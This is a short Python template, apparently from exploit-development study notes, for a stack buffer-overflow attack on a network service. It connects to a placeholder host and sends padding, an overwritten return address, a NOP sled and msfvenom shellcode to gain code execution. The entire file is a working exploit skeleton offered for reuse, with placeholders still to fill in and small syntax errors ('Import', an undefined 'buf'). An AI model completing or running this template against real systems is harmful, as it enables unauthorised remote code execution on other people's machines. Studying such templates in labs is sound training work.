#!/usr/bin/python3

Import socket
Import struct

s  =  socket.socket()
s.connect( ("IP", PORT) )

nop_sled= b"\x90"*16
total_length =  <length of spiked crash>
offset=<offset>
new_eip= struct.pack("<I", address of jmp with 0x)

#<paste in shellcode generated by msfvenom it should be in buf += format with b>
shellcode = buf

payload = [
	# Any instructions found before payload in EAX make sure its in b"" format
	b"A"*offset,
	new_eip,
	nop_sled,
	shellcode,
	b"C"*( total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode) )
]
payload = b"".join(payload)

s.send(payload)

s.close()